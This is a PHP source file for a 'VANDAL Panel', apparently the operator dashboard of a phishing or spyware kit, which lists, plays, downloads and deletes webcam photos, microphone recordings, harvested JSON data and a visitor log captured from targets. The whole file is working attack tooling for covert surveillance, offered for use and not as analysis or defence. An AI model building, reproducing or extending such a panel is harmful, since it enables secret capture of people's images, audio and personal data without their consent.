<?php
session_start();
if (!isset($_SESSION['logged_in'])) { header('Location: login.php'); exit; }

$cams = glob('webcam_*.jpg'); rsort($cams);
$mics = glob('mic_*.webm'); rsort($mics);
$jsons = glob('*.json'); rsort($jsons);

if (isset($_GET['dl'])) {
    $n = basename($_GET['dl']);
    if (is_file($n)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $n . '"');
        readfile($n);
        exit;
    }
}
if (isset($_GET['view'])) {
    $n = basename($_GET['view']);
    if (is_file($n)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($n);
        exit;
    }
}
if (isset($_GET['del'])) {
    $n = basename($_GET['del']);
    if (is_file($n)) unlink($n);
    header('Location: panel.php'); exit;
}
if (isset($_GET['purge'])) {
    foreach (glob('*.jpg') as $f) unlink($f);
    foreach (glob('*.webm') as $f) unlink($f);
    foreach (glob('*.json') as $f) unlink($f);
    foreach (glob('*.txt') as $f) unlink($f);
    header('Location: panel.php'); exit;
}
?>
<!doctype html><html lang="fa" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="10"><title>VANDAL Panel</title>
<style>*{margin:0;padding:0}body{background:#06060d;color:#c8c8d8;font-family:system-ui,sans-serif;padding:20px}
h1{color:#ff3838;font-size:20px;margin-bottom:10px}
.bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
.bar a,.bar button{color:#4499ff;text-decoration:none;font-size:11px;padding:6px 12px;background:#0d0d1a;border:1px solid #1a1a30;border-radius:6px;cursor:pointer}
.bar a.danger{color:#ff3838;border-color:#ff3838}
.stats{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px}
.stat{background:#0d0d1a;border:1px solid #1a1a30;border-radius:8px;padding:12px 16px;text-align:center;min-width:80px}
.stat b{font-size:22px;color:#fff;display:block}.stat span{font-size:10px;color:#888}
h2{font-size:14px;color:#ff3838;border-bottom:1px solid #1a1a30;padding-bottom:8px;margin:20px 0 10px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.card{background:#0d0d1a;border:1px solid #1a1a30;border-radius:10px;padding:6px;text-align:center}
.card img{width:100%;border-radius:6px;cursor:pointer}.card audio{width:100%}
.card div{font-size:10px;color:#888;margin-top:5px;display:flex;justify-content:space-between;align-items:center}
.card a{color:#ff3838;text-decoration:none}
.log{background:#0d0d1a;border:1px solid #1a1a30;border-radius:8px;padding:12px;max-height:200px;overflow-y:auto;font-size:10px;font-family:monospace;white-space:pre-wrap;margin-top:10px}
.empty{color:#555;text-align:center;padding:20px}
</style></head><body>
<h1>📸 VANDAL Panel</h1>
<div class="bar">
 <a href="panel.php">🔄 Refresh</a>
 <a href="visits.txt">📋 Visits</a>
 <a href="?purge=1" class="danger" onclick="return confirm('Delete all?')">🗑 Purge All</a>
</div>
<div class="stats">
 <div class="stat"><b><?=count($cams)?></b><span>📸 Photos</span></div>
 <div class="stat"><b><?=count($mics)?></b><span>🎤 Audio</span></div>
 <div class="stat"><b><?=count($jsons)?></b><span>📄 Data</span></div>
</div>
<h2>📸 Camera</h2>
<div class="grid"><?php if($cams): foreach($cams as $c): ?><div class="card"><img src="<?=$c?>" onclick="window.open(this.src)"><div><?=$c?> <a href="?del=<?=urlencode($c)?>">×</a></div></div><?php endforeach; else: ?><div class="empty">No photos yet</div><?php endif; ?></div>
<h2>🎤 Microphone</h2>
<div class="grid"><?php if($mics): foreach($mics as $m): ?><div class="card"><audio controls src="<?=$m?>"></audio><div><?=$m?> <a href="?del=<?=urlencode($m)?>">×</a></div></div><?php endforeach; else: ?><div class="empty">No audio yet</div><?php endif; ?></div>
<h2>📄 Data</h2>
<div class="grid"><?php if($jsons): foreach($jsons as $j): ?><div class="card" style="padding:10px;word-break:break-all;text-align:left;direction:ltr"><div style="font-size:11px;color:#c8c8d8"><?=$j?></div><div style="margin-top:8px;justify-content:flex-start;gap:10px"><a href="?view=<?=urlencode($j)?>" target="_blank" style="color:#4499ff">👁</a><a href="?dl=<?=urlencode($j)?>" style="color:#4499ff">📥</a><a href="?del=<?=urlencode($j)?>" style="color:#ff3838">🗑</a></div></div><?php endforeach; else: ?><div class="empty">No data yet</div><?php endif; ?></div>
<h2>📋 Visit Log</h2>
<div class="log"><?=is_file('visits.txt')?nl2br(htmlspecialchars(file_get_contents('visits.txt'))):'<span class="empty">No visits</span>'?></div>
</body></html>